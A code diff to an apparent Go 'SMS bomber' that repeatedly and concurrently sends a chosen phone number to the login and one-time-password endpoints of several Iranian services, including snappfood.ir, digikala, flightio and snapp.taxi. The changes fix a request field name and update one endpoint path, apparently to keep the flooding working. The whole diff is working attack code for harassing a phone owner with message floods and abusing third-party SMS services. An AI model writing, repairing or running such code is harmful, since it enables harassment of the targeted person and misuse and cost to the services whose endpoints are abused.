@@ -109,7 +109,7 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 		go sms("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", map[string]interface{}{
-			"callphone": phone,
+			"cellphone": phone,
 		}, ch)
 		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
 			"username": phone,
@@ -117,7 +117,7 @@ func main() {
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)
-		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
+		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)
 	} // Closing brace for the first for loop
